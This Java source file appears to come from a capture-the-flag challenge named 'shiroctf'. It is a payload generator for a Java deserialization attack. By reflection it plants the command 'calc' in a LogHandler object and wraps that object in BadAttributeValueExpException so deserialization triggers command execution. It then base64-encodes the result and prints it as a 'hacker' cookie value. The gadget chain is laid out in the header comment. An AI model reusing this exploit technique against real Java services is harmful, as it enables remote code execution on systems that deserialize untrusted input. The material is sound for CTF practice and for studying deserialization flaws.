package com.summersec.shiroctf.Tools;

import javax.management.BadAttributeValueExpException;
import javax.tools.Tool;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @ClassName: main
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/12/31 17:12
 * @Version: v1.0.0
 * @Description:
 *              Gadget：
 *                  Tools.base64Decode()
 *                      Tools.deserialize()
 *                          ObjectInputStream.readObject()
 *                              BadAttributeValueExpException.readObject()
 *                                  LogHandler.toSting()
 *                                      Tools.exeCmd()
 *
 **/
public class Payload {
    public static void main(String[] args) throws Throwable {
//        invoke();
//        ToString();
//        Calc();
//        testinvoke();
//        testtoString();
        testcalc();
    }

    private static void testcalc() throws Exception {
        LogHandler log = new LogHandler();
        Field readLog = log.getClass().getDeclaredField("readLog");
        readLog.setAccessible(true);
        readLog.set(log, "calc");

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Field val = bad.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bad, log);
//        序列化、编码
        byte[] serialize = Tools.serialize(bad);
        String s = Tools.base64Encode(serialize);

        System.out.println(s);
        Tools.deserialize(Tools.base64Decode(s));

    }

    private static void testtoString() throws NoSuchFieldException, IllegalAccessException {
        LogHandler log = new LogHandler();
        Field readLog = log.getClass().getDeclaredField("readLog");
        readLog.setAccessible(true);
        readLog.set(log, "calc");
//        调用toString的exec方法
        log.toString();

    }

    public static void testinvoke() throws Throwable {
        LogHandler log = new LogHandler();
        Field writeLog = log.getClass().getDeclaredField("writeLog");
        writeLog.setAccessible(true);
        writeLog.set(log, "calc");

//        准备调用invoke，执行exec方法
        Object object = new Object();
        Method method = log.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);
        Object[] args = new Object[]{"111","222"};
        log.invoke(object, method, args);


    }


    /**
     * @Description: invoke方法执行命令
     * @param
     *
     * @return:
     */
    public static void invoke() throws Throwable {
        LogHandler logHandler = new LogHandler();
        Field wirtelog = logHandler.getClass().getDeclaredField("writeLog");
        wirtelog.setAccessible(true);
        wirtelog.set(logHandler, "calc");
        Object ob = new Object();
        Method method = logHandler.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);
        Object[] obs = new Object[]{"asd"};
        logHandler.invoke(ob,method,obs);
    }

    /**
     * @Description: toString 方法执行命令
     * @param
     *
     * @return:
     */
    public static void ToString() throws NoSuchFieldException, IllegalAccessException {
        LogHandler logHandler = new LogHandler();
        Field readlog = logHandler.getClass().getDeclaredField("readLog");
        readlog.setAccessible(true);
        readlog.set(logHandler, "calc");
        logHandler.toString();

    }
    /**
     * @Description: Gadget
     *
     * @param
     *
     * @return:
     */
    public static void Calc() throws Throwable {
        LogHandler logHandler = new LogHandler();
        Field readlog = logHandler.getClass().getDeclaredField("readLog");
        readlog.setAccessible(true);
        readlog.set(logHandler, "calc");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, logHandler);

        String datas = Tools.base64Encode(Tools.serialize(badAttributeValueExpException));
        System.out.println("Cookie: " + "hacker="+ datas);
        Tools.deserialize(Tools.base64Decode(datas));

    }

}
